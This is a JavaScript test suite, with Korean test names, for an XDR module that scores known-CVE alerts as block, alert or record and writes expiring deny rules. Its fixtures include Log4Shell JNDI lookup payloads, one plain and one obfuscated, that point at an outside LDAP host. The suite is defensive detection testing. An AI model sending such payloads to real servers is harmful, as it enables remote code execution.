import assert from 'node:assert/strict';
import { mkdtemp, mkdir, readFile, rm, cp } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import test from 'node:test';
import { decide } from '../xdr/known-cve/decide.mjs';
import { respond } from '../xdr/known-cve/respond.mjs';
import { runXdr } from '../scripts/xdr-run.mjs';

const root = join(dirname(fileURLToPath(import.meta.url)), '..');
const alertOf = (data, level = 12, mitre = ['T1190']) => ({
  id: 'kc-test', timestamp: '2026-09-27T09:00:00+09:00', agent: { name: 'choi-bujang-pc' },
  rule: { level, description: '시험 경보', mitre }, data: { srcip: '203.0.113.10', ...data },
});

test('decide.mjs 는 다른 파일이나 패키지를 불러오지 않고 파일 쓰기도 하지 않는다', async () => {
  const source = await readFile(join(root, 'xdr', 'known-cve', 'decide.mjs'), 'utf8');
  assert.doesNotMatch(source, /^\s*import\s/mu);
  assert.doesNotMatch(source, /\brequire\s*\(|\bimport\s*\(|node:fs|writeFile|appendFile|fetch\s*\(/u);
});

test('완전한 원격 조회 구문은 block, 이름만 있는 글자는 block 하지 않는다', async () => {
  const strong = decide(alertOf({ useragent: '${jndi:ldap://203.0.113.9/x}' }));
  assert.equal(strong.action, 'block');
  assert.ok(strong.confidence >= 0.85);

  const obfuscated = decide(alertOf({ url: '/q?x=%24%7B%24%7Blower:j%7Dndi:ldap://203.0.113.9/x%7D' }));
  assert.equal(obfuscated.action, 'block');

  const name = decide(alertOf({ url: '/search?q=CVE-2021-44228' }, 6));
  assert.equal(name.action, 'alert');
  const fragment = decide(alertOf({ url: '/search?q=${jndi' }, 6));
  assert.equal(fragment.action, 'alert');

  const normal = decide(alertOf({ srcuser: 'user01', url: '/api/notes/demo' }, 3, []));
  assert.equal(normal.action, 'record');
  assert.ok(normal.confidence < 0.5);
});

test('시험 경보 전체: 정상 이벤트를 block 하지 않고 block·alert·record 가 나뉜다', async () => {
  const fixture = JSON.parse(await readFile(join(root, 'xdr', 'fixtures', 'known-cve.json'), 'utf8'));
  const out = fixture.alerts.map((alert) => ({ alert, decision: decide(alert) }));
  for (const { alert, decision } of out) {
    if (alert.rule.level <= 4) assert.equal(decision.action, 'record', alert.id);
    if (decision.action === 'block') assert.ok(decision.confidence >= 0.85, alert.id);
  }
  const counts = { block: 0, alert: 0, record: 0 };
  for (const { decision } of out) counts[decision.action] += 1;
  assert.ok(counts.block > 0 && counts.alert > 0 && counts.record > 0, JSON.stringify(counts));
});

test('차단 후보만 만료 시각과 근거 경보 번호가 있는 거부 규칙이 되고 알림이 쌓인다', async () => {
  const dir = await mkdtemp(join(tmpdir(), 'xdr-kc-'));
  try {
    await mkdir(join(dir, 'xdr', 'fixtures'), { recursive: true });
    await cp(join(root, 'xdr', 'fixtures', 'known-cve.json'),
      join(dir, 'xdr', 'fixtures', 'known-cve.json'));
    const first = await respond({ root: dir, now: () => new Date('2026-10-01T00:00:00.000Z') });
    assert.ok(first.addedRules.length > 0);
    for (const rule of first.addedRules) {
      assert.equal(rule.action, 'deny');
      assert.match(rule.evidenceAlertId, /^kc-\d+$/u);
      assert.ok(Date.parse(rule.expiresAt) > Date.parse(rule.createdAt));
    }
    const rules = JSON.parse(await readFile(join(dir, 'xdr', 'ztna-deny-rules.json'), 'utf8'));
    const log = (await readFile(join(dir, 'xdr', 'alerts.log'), 'utf8')).trim().split('\n');
    assert.equal(rules.rules.length, first.addedRules.length);
    assert.equal(log.length, first.addedRules.length);

    // 같은 경보로 다시 흘려도 규칙과 알림이 중복되지 않는다.
    const second = await respond({ root: dir, now: () => new Date('2026-10-01T00:05:00.000Z') });
    assert.equal(second.addedRules.length, 0);
    assert.equal(second.notificationsAppended, 0);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test('실행기가 known-cve 결과를 만들고 건수가 경보 수와 같다', async () => {
  const dir = await mkdtemp(join(tmpdir(), 'xdr-run-'));
  try {
    for (const path of ['xdr/fixtures/known-cve.json', 'xdr/known-cve/decide.mjs']) {
      await mkdir(dirname(join(dir, path)), { recursive: true });
      await cp(join(root, path), join(dir, path));
    }
    const result = await runXdr({ root: dir, moduleKey: 'known-cve' });
    const total = result.counts.block + result.counts.alert + result.counts.record;
    assert.equal(total, result.decisions.length);
    assert.equal(total, 24);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});
